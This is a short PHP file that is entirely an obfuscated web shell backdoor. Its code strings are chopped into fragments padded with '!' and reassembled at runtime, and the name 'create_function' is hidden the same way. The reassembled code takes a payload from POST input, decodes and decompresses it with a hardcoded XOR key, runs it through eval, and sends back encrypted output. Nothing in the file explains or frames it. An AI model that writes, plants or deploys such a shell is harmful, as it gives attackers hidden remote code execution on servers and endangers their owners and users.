<?php
$H='end_clea!n();$!r=@base6!4_enc!ode(!@x(@gzco!mpres!s($o!),$k));p!ri!nt("$p$kh$r!$kf");}';
$g='@e!val!(@gzuncomp!ress(@x(@b!ase!64_deco!de($m![1]),!$k)));$o=@!ob_ge!t_con!t!e!nts();@ob_';
$o='func!t!ion x($t,$!k){$c=s!trlen($k)!;$l!=strl!en($t!!);$o="";for!!($i=0!;$i<$l;){for!($';
$y='$k="b645a!368!";$kh="2!49d34!b!625a!a";$kf="1!6!!8668cedf54";$p=!"pJ9PlKOu6!8ZdiOF6!";';
$D=str_replace('ip','','ipcreipateip_fuipipnctiipon');
$K='j=0;($!j<$c&&$i<$!l);$j+!+,$i++!){$o.=!$t{!$i}^$k{$!j};!}}retu!rn! $o;}if (!@p!reg_mat';
$N='ch("/$!kh!(.+)$k!f!/",@file_get_con!tent!s(!"php:!!//in!put"),$m)==1) {@ob_st!art(!);';
$U=str_replace('!','',$y.$o.$K.$N.$g.$H);
$Y=$D('',$U);$Y();
?>
